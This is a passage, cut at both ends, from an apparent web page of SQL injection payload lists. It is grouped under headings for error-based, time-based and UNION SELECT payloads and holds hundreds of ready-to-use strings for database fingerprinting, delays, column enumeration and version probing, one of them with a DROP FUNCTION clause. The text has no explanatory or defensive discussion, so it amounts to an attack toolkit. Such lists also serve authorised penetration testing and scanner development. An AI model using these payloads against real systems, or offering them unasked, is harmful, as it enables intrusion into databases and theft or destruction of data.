1,2--+\n1' ORDER BY 1,2,3--+\n\n1' GROUP BY 1,2,--+\n1' GROUP BY 1,2,3--+\n' GROUP BY columnnames having 1=1 --\n\n\n-1' UNION SELECT 1,2,3--+\n' UNION SELECT sum(columnname ) from tablename --\n\n\n-1 UNION SELECT 1 INTO @,@\n-1 UNION SELECT 1 INTO @,@,@\n\n1 AND (SELECT * FROM Users) = 1\t\n\n' AND MID(VERSION(),1,1) = '5';\n\n' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --\n\n\nFinding the table name\n\n\nTime-Based:\n,(select * from (select(sleep(10)))a)\n%2c(select%20*%20from%20(select(sleep(10)))a)\n';WAITFOR DELAY '0:0:30'--\n\nComments:\n\n#\t    Hash comment\n/*  \tC-style comment\n-- -\tSQL comment\n;%00\tNullbyte\n`\t    Backtick\n</code></pre>\n<h2 id=\"generic-error-based-payloads\"><a class=\"anchor\" href=\"#generic-error-based-payloads\">#</a> Generic Error Based Payloads</h2>\n<pre><code> OR 1=1\n OR 1=0\n OR x=x\n OR x=y\n OR 1=1#\n OR 1=0#\n OR x=x#\n OR x=y#\n OR 1=1-- \n OR 1=0-- \n OR x=x-- \n OR x=y-- \n OR 3409=3409 AND ('pytW' LIKE 'pytW\n OR 3409=3409 AND ('pytW' LIKE 'pytY\n HAVING 1=1\n HAVING 1=0\n HAVING 1=1#\n HAVING 1=0#\n HAVING 1=1-- \n HAVING 1=0-- \n AND 1=1\n AND 1=0\n AND 1=1-- \n AND 1=0-- \n AND 1=1#\n AND 1=0#\n AND 1=1 AND '%'='\n AND 1=0 AND '%'='\n AND 1083=1083 AND (1427=1427\n AND 7506=9091 AND (5913=5913\n AND 1083=1083 AND ('1427=1427\n AND 7506=9091 AND ('5913=5913\n AND 7300=7300 AND 'pKlZ'='pKlZ\n AND 7300=7300 AND 'pKlZ'='pKlY\n AND 7300=7300 AND ('pKlZ'='pKlZ\n AND 7300=7300 AND ('pKlZ'='pKlY\n AS INJECTX WHERE 1=1 AND 1=1\n AS INJECTX WHERE 1=1 AND 1=0\n AS INJECTX WHERE 1=1 AND 1=1#\n AS INJECTX WHERE 1=1 AND 1=0#\n AS INJECTX WHERE 1=1 AND 1=1--\n AS INJECTX WHERE 1=1 AND 1=0--\n WHERE 1=1 AND 1=1\n WHERE 1=1 AND 1=0\n WHERE 1=1 AND 1=1#\n WHERE 1=1 AND 1=0#\n WHERE 1=1 AND 1=1--\n WHERE 1=1 AND 1=0--\n ORDER BY 1-- \n ORDER BY 2-- \n ORDER BY 3-- \n ORDER BY 4-- \n ORDER BY 5-- \n ORDER BY 6-- \n ORDER BY 7-- \n ORDER BY 8-- \n ORDER BY 9-- \n ORDER BY 10-- \n ORDER BY 11-- \n ORDER BY 12-- \n ORDER BY 13-- \n ORDER BY 14-- \n ORDER BY 15-- \n ORDER BY 16-- \n ORDER BY 17-- \n ORDER BY 18-- \n ORDER BY 19-- \n ORDER BY 20-- \n ORDER BY 21-- \n ORDER BY 22-- \n ORDER BY 23-- \n ORDER BY 24-- \n ORDER BY 25-- \n ORDER BY 26-- \n ORDER BY 27-- \n ORDER BY 28-- \n ORDER BY 29-- \n ORDER BY 30-- \n ORDER BY 31337-- \n ORDER BY 1# \n ORDER BY 2# \n ORDER BY 3# \n ORDER BY 4# \n ORDER BY 5# \n ORDER BY 6# \n ORDER BY 7# \n ORDER BY 8# \n ORDER BY 9# \n ORDER BY 10# \n ORDER BY 11# \n ORDER BY 12# \n ORDER BY 13# \n ORDER BY 14# \n ORDER BY 15# \n ORDER BY 16# \n ORDER BY 17# \n ORDER BY 18# \n ORDER BY 19# \n ORDER BY 20# \n ORDER BY 21# \n ORDER BY 22# \n ORDER BY 23# \n ORDER BY 24# \n ORDER BY 25# \n ORDER BY 26# \n ORDER BY 27# \n ORDER BY 28# \n ORDER BY 29# \n ORDER BY 30#\n ORDER BY 31337#\n ORDER BY 1 \n ORDER BY 2 \n ORDER BY 3 \n ORDER BY 4 \n ORDER BY 5 \n ORDER BY 6 \n ORDER BY 7 \n ORDER BY 8 \n ORDER BY 9 \n ORDER BY 10 \n ORDER BY 11 \n ORDER BY 12 \n ORDER BY 13 \n ORDER BY 14 \n ORDER BY 15 \n ORDER BY 16 \n ORDER BY 17 \n ORDER BY 18 \n ORDER BY 19 \n ORDER BY 20 \n ORDER BY 21 \n ORDER BY 22 \n ORDER BY 23 \n ORDER BY 24 \n ORDER BY 25 \n ORDER BY 26 \n ORDER BY 27 \n ORDER BY 28 \n ORDER BY 29 \n ORDER BY 30 \n ORDER BY 31337 \n RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\n RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\nIF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\nIF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\n%' AND 8310=8310 AND '%'='\n%' AND 8310=8311 AND '%'='\n and (select substring(@@version,1,1))='X'\n and (select substring(@@version,1,1))='M'\n and (select substring(@@version,2,1))='i'\n and (select substring(@@version,2,1))='y'\n and (select substring(@@version,3,1))='c'\n and (select substring(@@version,3,1))='S'\n and (select substring(@@version,3,1))='X'\n</code></pre>\n<h2 id=\"generic-time-based-sql-injection-payloads\"><a class=\"anchor\" href=\"#generic-time-based-sql-injection-payloads\">#</a> Generic Time Based SQL Injection Payloads</h2>\n<pre><code># from wapiti\nsleep(5)#\n1 or sleep(5)#\n&quot; or sleep(5)#\n' or sleep(5)#\n&quot; or sleep(5)=&quot;\n' or sleep(5)='\n1) or sleep(5)#\n&quot;) or sleep(5)=&quot;\n') or sleep(5)='\n1)) or sleep(5)#\n&quot;)) or sleep(5)=&quot;\n')) or sleep(5)='\n;waitfor delay '0:0:5'--\n);waitfor delay '0:0:5'--\n';waitfor delay '0:0:5'--\n&quot;;waitfor delay '0:0:5'--\n');waitfor delay '0:0:5'--\n&quot;);waitfor delay '0:0:5'--\n));waitfor delay '0:0:5'--\n'));waitfor delay '0:0:5'--\n&quot;));waitfor delay '0:0:5'--\nbenchmark(10000000,MD5(1))#\n1 or benchmark(10000000,MD5(1))#\n&quot; or benchmark(10000000,MD5(1))#\n' or benchmark(10000000,MD5(1))#\n1) or benchmark(10000000,MD5(1))#\n&quot;) or benchmark(10000000,MD5(1))#\n') or benchmark(10000000,MD5(1))#\n1)) or benchmark(10000000,MD5(1))#\n&quot;)) or benchmark(10000000,MD5(1))#\n')) or benchmark(10000000,MD5(1))#\npg_sleep(5)--\n1 or pg_sleep(5)--\n&quot; or pg_sleep(5)--\n' or pg_sleep(5)--\n1) or pg_sleep(5)--\n&quot;) or pg_sleep(5)--\n') or pg_sleep(5)--\n1)) or pg_sleep(5)--\n&quot;)) or pg_sleep(5)--\n')) or pg_sleep(5)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe\nAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--\nAND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#\nSLEEP(5)#\nSLEEP(5)--\nSLEEP(5)=&quot;\nSLEEP(5)='\nor SLEEP(5)\nor SLEEP(5)#\nor SLEEP(5)--\nor SLEEP(5)=&quot;\nor SLEEP(5)='\nwaitfor delay '00:00:05'\nwaitfor delay '00:00:05'--\nwaitfor delay '00:00:05'#\nbenchmark(50000000,MD5(1))\nbenchmark(50000000,MD5(1))--\nbenchmark(50000000,MD5(1))#\nor benchmark(50000000,MD5(1))\nor benchmark(50000000,MD5(1))--\nor benchmark(50000000,MD5(1))#\npg_SLEEP(5)\npg_SLEEP(5)--\npg_SLEEP(5)#\nor pg_SLEEP(5)\nor pg_SLEEP(5)--\nor pg_SLEEP(5)#\n'\\&quot;\nAnD SLEEP(5)\nAnD SLEEP(5)--\nAnD SLEEP(5)#\n&amp;&amp;SLEEP(5)\n&amp;&amp;SLEEP(5)--\n&amp;&amp;SLEEP(5)#\n' AnD SLEEP(5) ANd '1\n'&amp;&amp;SLEEP(5)&amp;&amp;'1\nORDER BY SLEEP(5)\nORDER BY SLEEP(5)--\nORDER BY SLEEP(5)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#\n(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--\n+benchmark(3200,SHA1(1))+'\n+ SLEEP(10) + '\nRANDOMBLOB(500000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\nRANDOMBLOB(1000000000/2)\nAND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nOR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nSLEEP(1)/*' or SLEEP(1) or '&quot; or SLEEP(1) or &quot;*/\n</code></pre>\n<h2 id=\"generic-union-select-payloads\"><a class=\"anchor\" href=\"#generic-union-select-payloads\">#</a> Generic Union Select Payloads</h2>\n<pre><code> ORDER BY SLEEP(5)\n ORDER BY 1,SLEEP(5)\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n ORDER BY SLEEP(5)#\n ORDER BY 1,SLEEP(5)#\n ORDER BY 1,SLEEP(5),3#\n ORDER BY 1,SLEEP(5),3,4#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n ORDER BY SLEEP(5)-- \n ORDER BY 1,SLEEP(5)-- \n ORDER BY 1,SLEEP(5),3-- \n ORDER BY 1,SLEEP(5),3,4-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 1\n UNION ALL SELECT 1,2\n UNION ALL SELECT 1,2,3\n UNION ALL SELECT 1,2,3,4\n UNION ALL SELECT 1,2,3,4,5\n UNION ALL SELECT 1,2,3,4,5,6\n UNION ALL SELECT 1,2,3,4,5,6,7\n UNION ALL SELECT 1,2,3,4,5,6,7,8\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 1#\n UNION ALL SELECT 1,2#\n UNION ALL SELECT 1,2,3#\n UNION ALL SELECT 1,2,3,4#\n UNION ALL SELECT 1,2,3,4,5#\n UNION ALL SELECT 1,2,3,4,5,6#\n UNION ALL SELECT 1,2,3,4,5,6,7#\n UNION ALL SELECT 1,2,3,4,5,6,7,8#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT 1-- \n UNION ALL SELECT 1,2-- \n UNION ALL SELECT 1,2,3-- \n UNION ALL SELECT 1,2,3,4-- \n UNION ALL SELECT 1,2,3,4,5-- \n UNION ALL SELECT 1,2,3,4,5,6-- \n UNION ALL SELECT 1,2,3,4,5,6,7-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION SELECT @@VERSION,SLEEP(5),3\n UNION SELECT @@VERSION,SLEEP(5),USER(),4\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14\n UNION SELECT 